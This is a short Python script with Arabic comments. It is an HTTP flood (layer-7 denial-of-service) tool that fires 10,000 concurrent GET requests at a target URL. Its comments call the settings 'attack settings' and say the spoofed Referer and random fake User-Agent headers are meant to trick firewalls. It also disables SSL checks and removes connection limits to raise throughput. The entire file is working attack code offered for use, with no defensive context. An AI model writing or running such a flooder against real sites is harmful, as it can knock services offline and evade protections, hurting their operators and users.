import asyncio
import aiohttp
import time
from fake_useragent import UserAgent

# إعدادات الهجوم
url = "https://request.layer7dstat.uk/"
request_count = 10000  # عدد الطلبات
concurrent_requests = 1000  # عدد الطلبات المتزامنة

# إنشاء كائن UserAgent لتوليد وكلاء مزيفين
ua = UserAgent()

async def send_request(session, request_number, semaphore):
    async with semaphore:  # التحكم في عدد الطلبات المتزامنة
        try:
            headers = {
                "User-Agent": ua.random,  # توليد User-Agent عشوائي لكل طلب
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": url,  # خداع بعض الجدران النارية
            }

            async with session.get(url, headers=headers, timeout=10) as response:
                await response.text()  # انتظار البيانات فعليًا
                print(f"الطلب {request_number}: حالة الاستجابة {response.status}")  # طباعة النتيجة فورًا
        except Exception as e:
            print(f"خطأ في الطلب {request_number}: {e}")  # طباعة الخطأ فورًا

async def main():
    start_time = time.time()

    semaphore = asyncio.Semaphore(concurrent_requests)  # تحديد عدد الطلبات المتزامنة
    connector = aiohttp.TCPConnector(limit=0, ssl=False)  # إزالة قيود الاتصالات وتعطيل SSL لتسريع الطلبات
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_request(session, i, semaphore) for i in range(1, request_count + 1)]

        # تنفيذ الطلبات وطباعة النتائج فور استلامها
        for task in asyncio.as_completed(tasks):
            await task  

    end_time = time.time()
    print(f"تم إرسال جميع الطلبات في {end_time - start_time:.2f} ثانية")

# تشغيل الكود
asyncio.run(main())
